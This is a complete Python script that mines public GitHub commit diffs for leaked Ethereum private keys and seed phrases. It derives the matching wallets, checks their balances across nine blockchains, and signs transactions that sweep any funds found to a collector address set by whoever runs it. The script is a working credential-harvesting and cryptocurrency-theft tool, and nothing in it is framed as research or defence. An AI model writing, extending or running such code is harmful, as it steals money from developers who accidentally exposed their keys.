#!/usr/bin/env python3
"""
dot

"""

import os
import re
import sys
import json
import time
import gzip
import getpass
import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from eth_account import Account

Account.enable_unaudited_hdwallet_features()

# ---------------- CONFIG ----------------
GITHUB_TOKEN = os.environ.get("GH_TOKEN", "").strip()
COLLECTOR = os.environ.get("COLLECTOR", "").strip()

STATE_FILE = "state.json"
LOG_FILE = "hits.log"

CHAINS = {
    "base": {"rpc": "https://mainnet.base.org", "chain_id": 8453,
             "symbol": "ETH", "dust": 0.0001, "gas_buffer": 1.5},
    "arbitrum": {"rpc": "https://arb1.arbitrum.io/rpc", "chain_id": 42161,
                 "symbol": "ETH", "dust": 0.0001, "gas_buffer": 1.6},
    "optimism": {"rpc": "https://mainnet.optimism.io", "chain_id": 10,
                 "symbol": "ETH", "dust": 0.0001, "gas_buffer": 1.6},
    "bsc": {"rpc": "https://bsc-dataseed.binance.org", "chain_id": 56,
            "symbol": "BNB", "dust": 0.002, "gas_buffer": 1.6,
            "min_gas_price": 1_000_000_000},
    "polygon": {"rpc": "https://polygon-rpc.com", "chain_id": 137,
                "symbol": "MATIC", "dust": 0.005, "gas_buffer": 1.6,
                "min_gas_price": 30_000_000_000},
    "gnosis": {"rpc": "https://rpc.gnosischain.com", "chain_id": 100,
               "symbol": "xDAI", "dust": 0.01, "gas_buffer": 1.6},
    "avalanche": {"rpc": "https://api.avax.network/ext/bc/C/rpc", "chain_id": 43114,
                  "symbol": "AVAX", "dust": 0.01, "gas_buffer": 1.7,
                  "min_gas_price": 25_000_000_000},
    "linea": {"rpc": "https://rpc.linea.build", "chain_id": 59144,
              "symbol": "ETH", "dust": 0.0001, "gas_buffer": 1.7},
    "mainnet": {"rpc": "https://ethereum-rpc.publicnode.com", "chain_id": 1,
                "symbol": "ETH", "dust": 0.005, "gas_buffer": 2.0},
}

SWEEP_ENABLED = True
ARCHIVE_HOURS = 2
MAX_COMMITS_PER_RUN = 350
MAX_ADDRESSES_PER_RUN = 300
FETCH_WORKERS = 10
CHECK_WORKERS = 6
RUN_BUDGET_SEC = 780

TEST_KEYS = {
    "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
    "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d",
    "0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d",
}

HEX_KEY = re.compile(r"(?<![0-9a-fA-Fx])0x[0-9a-fA-F]{64}(?![0-9a-fA-F])")
PKEY_ANY = re.compile(
    r"(?:PRIVATE_KEY|PRIVATEKEY|WALLET_KEY|DEPLOYER_KEY|SECRET_KEY|PK)\s*[=:]\s*[\"']?(?:0x)?([0-9a-fA-F]{64})",
    re.IGNORECASE,
)
MNEMONIC = re.compile(
    r"(?:mnemonic|seed|secret|mnemonicPhrase)\s*[=:]\s*[\"']?((?:[a-z]{3,8}[ \t]+){11,23}[a-z]{3,8})",
    re.IGNORECASE,
)

START = time.time()


def out_of_time():
    return (time.time() - START) > RUN_BUDGET_SEC


# ---------------- CREDENTIALS ----------------
def resolve_creds():
    global GITHUB_TOKEN, COLLECTOR

    if not COLLECTOR:
        if not sys.stdin.isatty():
            raise SystemExit("no COLLECTOR set and no terminal to ask")
        COLLECTOR = input("Collector wallet address (0x...): ").strip()
        if not re.fullmatch(r"0x[0-9a-fA-F]{40}", COLLECTOR):
            raise SystemExit("that doesn't look like an address")

    if not GITHUB_TOKEN:
        if not sys.stdin.isatty():
            raise SystemExit("no GH_TOKEN set and no terminal to ask")
        GITHUB_TOKEN = getpass.getpass("GitHub token (ghp_..., hidden): ").strip()
        if not GITHUB_TOKEN:
            raise SystemExit("no token given")

    print("[*] collector: " + COLLECTOR, flush=True)
    print("[*] token: " + GITHUB_TOKEN[:7] + "..." + GITHUB_TOKEN[-4:], flush=True)


# ---------------- HELPERS ----------------
def load_state():
    state = {"seen_addresses": [], "seen_shas": [], "q_offset": 0}
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE) as f:
                loaded = json.load(f)
            if isinstance(loaded, dict):
                state.update(loaded)
        except Exception:
            pass
    if not isinstance(state.get("seen_addresses"), list):
        state["seen_addresses"] = []
    if not isinstance(state.get("seen_shas"), list):
        state["seen_shas"] = []
    return state


def save_state(state):
    state["seen_addresses"] = state["seen_addresses"][-20000:]
    state["seen_shas"] = state["seen_shas"][-12000:]
    with open(STATE_FILE, "w") as f:
        json.dump(state, f)


def log(line):
    print(line, flush=True)
    try:
        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")
    except Exception:
        pass


def gh_headers(accept="application/vnd.github+json"):
    return {
        "Accept": accept,
        "Authorization": "Bearer " + GITHUB_TOKEN,
        "X-GitHub-Api-Version": "2022-11-28",
    }


def rpc(chain, method, params):
    cfg = CHAINS[chain]
    last = None
    for _ in range(2):
        try:
            r = requests.post(
                cfg["rpc"],
                json={"jsonrpc": "2.0", "id": 1, "method": method, "params": params},
                timeout=20,
            )
            r.raise_for_status()
            data = r.json()
            if "error" in data:
                raise RuntimeError(data["error"])
            return data["result"]
        except Exception as exc:
            last = exc
            time.sleep(0.3)
    raise last


def get_balance_wei(chain, addr):
    return int(rpc(chain, "eth_getBalance", [addr, "latest"]), 16)


def get_gas_price(chain):
    cfg = CHAINS[chain]
    price = int(rpc(chain, "eth_gasPrice", []), 16)
    if "min_gas_price" in cfg:
        price = max(price, cfg["min_gas_price"])
    return price


def dust_wei(chain):
    return int(CHAINS[chain]["dust"] * 1e18)


# ---------------- EXTRACTION ----------------
def candidates_from(text):
    found = []
    for m in HEX_KEY.finditer(text):
        found.append(("key", m.group(0)))
    for m in PKEY_ANY.finditer(text):
        k = m.group(1)
        found.append(("key", k if k.startswith("0x") else "0x" + k))
    for m in MNEMONIC.finditer(text):
        words = " ".join(m.group(1).split())
        if len(words.split()) in (12, 24):
            found.append(("mnemonic", words))
    return found


def added_lines(diff):
    return "\n".join(
        ln[1:] for ln in diff.splitlines()
        if ln.startswith("+") and not ln.startswith("+++")
    )


def derive(ctype, value):
    out = []
    if ctype == "key":
        try:
            out.append((Account.from_key(value).address, value))
        except Exception:
            pass
    else:
        for idx in (0, 1, 2):
            try:
                acct = Account.from_mnemonic(
                    value, account_path="m/44'/60'/0'/0/" + str(idx)
                )
                out.append((acct.address, acct.key.hex()))
            except Exception:
                break
    return out


# ---------------- SWEEP ----------------
def sweep(chain, privkey, balance_wei):
    cfg = CHAINS[chain]
    acct = Account.from_key(privkey)
    gas_price = get_gas_price(chain)
    gas_limit = 21000
    cost = int(gas_price * gas_limit * cfg["gas_buffer"])
    value = balance_wei - cost

    if value <= 0:
        return None, "gas exceeds balance"
    if value < dust_wei(chain):
        return None, "leftover below dust floor"

    nonce = int(rpc(chain, "eth_getTransactionCount", [acct.address, "pending"]), 16)
    tx = {
        "to": COLLECTOR, "value": value, "gas": gas_limit,
        "gasPrice": gas_price, "nonce": nonce,
        "chainId": cfg["chain_id"], "data": b"",
    }
    signed = acct.sign_transaction(tx)
    raw = signed.raw_transaction.hex()
    if not raw.startswith("0x"):
        raw = "0x" + raw
    txhash = rpc(chain, "eth_sendRawTransaction", [raw])
    return txhash, "%.8f %s" % (value / 1e18, cfg["symbol"])


# ---------------- SOURCE 1: GH ARCHIVE ----------------
def collect_archive(seen_shas):
    commits = []
    now = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(hours=1)
    for i in range(ARCHIVE_HOURS):
        if out_of_time() or len(commits) >= MAX_COMMITS_PER_RUN:
            break
        t = now - datetime.timedelta(hours=i)
        name = "%d-%d-%d-%d" % (t.year, t.month, t.day, t.hour)
        url = "https://data.gharchive.org/" + name + ".json.gz"
        try:
            r = requests.get(url, timeout=150)
            if r.status_code != 200:
                log("[a] %s -> %d" % (name, r.status_code))
                continue
            raw = gzip.decompress(r.content).decode("utf-8", "ignore")
        except Exception as exc:
            log("[a] %s failed: %s" % (name, str(exc)[:60]))
            continue

        got = 0
        for line in raw.splitlines():
            if '"PushEvent"' not in line:
                continue
            try:
                ev = json.loads(line)
            except Exception:
                continue
            repo = ev.get("repo", {}).get("name")
            if not repo:
                continue
            for c in (ev.get("payload", {}).get("commits") or [])[:2]:
                sha = c.get("sha")
                if sha and sha not in seen_shas:
                    commits.append((repo, sha))
                    got += 1
            if len(commits) >= MAX_COMMITS_PER_RUN:
                break
        log("[a] %s: %d commits (total %d)" % (name, got, len(commits)))
    return commits


# ---------------- SOURCE 2: LIVE EVENTS ----------------
def collect_events(seen_shas):
    commits = []
    for page in range(1, 4):
        if out_of_time() or len(commits) >= MAX_COMMITS_PER_RUN:
            break
        try:
            r = requests.get(
                "https://api.github.com/events",
                params={"per_page": 100, "page": page},
                headers=gh_headers(), timeout=30,
            )
            if r.status_code != 200:
                log("[e] events status %d" % r.status_code)
                break
            events = r.json()
        except Exception as exc:
            log("[e] events fail: " + str(exc)[:60])
            break
        if not events:
            break
        for ev in events:
            if ev.get("type") != "PushEvent":
                continue
            repo = ev.get("repo", {}).get("name")
            head = ev.get("payload", {}).get("head")
            if repo and head and head not in seen_shas:
                commits.append((repo, head))
        time.sleep(0.8)
    log("[e] %d commits from live events" % len(commits))
    return commits


# ---------------- FETCH ----------------
def fetch_diff(item):
    repo, sha = item
    try:
        r = requests.get(
            "https://api.github.com/repos/" + repo + "/commits/" + sha,
            headers=gh_headers("application/vnd.github.diff"), timeout=25,
        )
        if r.status_code != 200:
            return repo, sha, ""
        return repo, sha, r.text[:500_000]
    except Exception:
        return repo, sha, ""


def check_address(args):
    addr, priv, ctype, label = args
    found = []
    for chain in CHAINS:
        try:
            bal = get_balance_wei(chain, addr)
        except Exception:
            continue
        if bal >= dust_wei(chain):
            found.append((chain, bal))
    return addr, priv, ctype, label, found


# ---------------- MAIN ----------------
def main():
    resolve_creds()

    state = load_state()
    seen = set(state["seen_addresses"])
    seen_shas = set(state["seen_shas"])

    commits = collect_archive(seen_shas)
    if len(commits) < 40:
        commits += collect_events(seen_shas)
    else:
        log("[*] archive delivered enough, skipping live events")

    uniq, dedupe = [], set()
    for repo, sha in commits:
        if sha in dedupe:
            continue
        dedupe.add(sha)
        uniq.append((repo, sha))
    uniq = uniq[:MAX_COMMITS_PER_RUN]
    log("[*] %d commits to inspect" % len(uniq))

    work = []
    if uniq:
        with ThreadPoolExecutor(max_workers=FETCH_WORKERS) as pool:
            futs = [pool.submit(fetch_diff, it) for it in uniq]
            for fut in as_completed(futs):
                repo, sha, diff = fut.result()
                seen_shas.add(sha)
                if not diff:
                    continue
                up = diff.upper()
                if "PRIVATE" not in up and "MNEMONIC" not in up and "0X" not in up:
                    continue
                body = added_lines(diff)
                if body:
                    work.append((repo + "@" + sha[:8], body))

    log("[*] %d diffs carry candidates" % len(work))

    jobs = []
    for label, text in work:
        for ctype, value in candidates_from(text):
            if ctype == "key" and value.lower() in TEST_KEYS:
                continue
            for addr, priv in derive(ctype, value):
                if addr in seen:
                    continue
                seen.add(addr)
                jobs.append((addr, priv, ctype, label))
                if len(jobs) >= MAX_ADDRESSES_PER_RUN:
                    break
            if len(jobs) >= MAX_ADDRESSES_PER_RUN:
                break

    log("[*] %d new addresses to test" % len(jobs))

    hits = 0
    done = 0
    if jobs:
        with ThreadPoolExecutor(max_workers=CHECK_WORKERS) as pool:
            futs = [pool.submit(check_address, j) for j in jobs]
            for fut in as_completed(futs):
                done += 1
                if done % 50 == 0:
                    log("[.] %d/%d checked, %d hits" % (done, len(jobs), hits))
                addr, priv, ctype, label, found = fut.result()
                for chain, bal in found:
                    log("[HIT] %s %.8f %s %s (%s) <- %s"
                        % (chain, bal / 1e18, CHAINS[chain]["symbol"], addr, ctype, label))
                    log("      key: " + priv)
                    hits += 1
                    if SWEEP_ENABLED:
                        try:
                            txhash, moved = sweep(chain, priv, bal)
                            if txhash:
                                log("      swept " + moved + " -> " + COLLECTOR + " tx " + txhash)
                            else:
                                log("      not swept: " + moved)
                        except Exception as exc:
                            log("      sweep failed: " + str(exc))

    state["seen_addresses"] = list(seen)
    state["seen_shas"] = list(seen_shas)
    save_state(state)
    log("[*] done, %d commits, %d diffs, %d addresses, %d funded"
        % (len(uniq), len(work), len(jobs), hits))


if __name__ == "__main__":
    main()